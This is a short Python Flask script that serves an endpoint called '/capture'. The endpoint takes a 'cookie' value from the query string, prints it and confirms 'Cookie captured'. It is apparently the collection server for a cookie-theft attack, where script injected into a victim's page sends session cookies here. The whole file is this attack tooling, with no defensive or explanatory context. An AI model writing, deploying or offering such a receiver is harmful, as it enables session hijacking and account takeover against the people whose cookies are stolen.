from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/capture', methods=['GET'])
def capture():
    cookie = request.args.get('cookie')
    if cookie:
        print(cookie)
    return 'Cookie captured'
if __name__ == '__main__':
    app.run(debug=True)
